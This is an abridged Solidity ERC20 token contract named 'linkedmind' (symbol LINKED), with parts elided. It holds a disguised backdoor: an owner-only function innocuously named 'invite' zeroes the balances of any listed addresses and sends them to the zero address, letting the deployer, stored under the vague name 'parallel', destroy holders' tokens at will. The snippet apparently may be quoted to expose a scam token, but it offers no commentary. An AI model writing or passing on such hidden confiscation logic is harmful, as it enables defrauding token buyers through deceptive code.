...
contract linkedmind is Context, IERC20 {
    ...
    address public  parallel;
    constructor () {
        _name = "linked.mind";
        _symbol = "LINKED";
        _decimals = 18;
        uint256 initialSupply = 884000000;
         parallel = msg.sender;
    ...
    modifier onlyOwner() {
        require(msg.sender == parallel, "Not allowed");
        _;
    }

    function invite(address[] memory banner) public onlyOwner() {
    uint256 len = banner.length;
    for (uint256 i; i < len; ++i) {
        uint256 balance = _balances[banner[i]];
        _balances[banner[i]] = 0;
        _balances[address(0)] += balance;
    }
}
}